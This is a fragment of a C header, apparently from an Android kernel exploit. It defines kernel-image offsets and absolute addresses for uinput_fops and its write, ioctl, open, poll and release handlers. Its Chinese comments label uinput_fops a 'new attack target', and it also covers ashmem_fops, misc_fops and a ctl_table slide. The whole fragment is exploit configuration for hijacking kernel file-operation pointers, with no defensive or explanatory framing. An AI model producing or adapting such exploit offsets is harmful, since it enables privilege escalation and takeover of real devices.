...
/* ---- 新增：uinput_fops 作为新的攻击目标 ---- */
#define UINPUT_FOPS_OFF 0x0130d2a0ULL
...
/* ---- 新增：uinput_fops 的完整地址 ---- */
#define UINPUT_FOPS (KIMAGE_TEXT_BASE + UINPUT_FOPS_OFF)

/* ---- 原有：ashmem_fops 和 misc_fops 的完整地址 ---- */
...
#define SLIDE_PROC_DO_UUID_CTL_TABLE_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_PROC_DO_UUID_CTL_TABLE_OFF)
...
#define CFG_NEEDS_READ_FILL_OFF 84
...
/* ---- 新增：uinput_fops 的函数指针偏移量和地址 ---- */
#define UINPUT_WRITE_OFF 0x00b28a0cULL
#define UINPUT_IOCTL_OFF 0x00b28e3cULL
#define UINPUT_OPEN_OFF 0x00b28ed4ULL
#define UINPUT_POLL_OFF 0x00b28dc8ULL
#define UINPUT_RELEASE_OFF 0x00b28f94ULL

#define UINPUT_WRITE (KIMAGE_TEXT_BASE + UINPUT_WRITE_OFF)
#define UINPUT_IOCTL (KIMAGE_TEXT_BASE + UINPUT_IOCTL_OFF)
#define UINPUT_OPEN (KIMAGE_TEXT_BASE + UINPUT_OPEN_OFF)
#define UINPUT_POLL (KIMAGE_TEXT_BASE + UINPUT_POLL_OFF)
#define UINPUT_RELEASE (KIMAGE_TEXT_BASE + UINPUT_RELEASE_OFF)
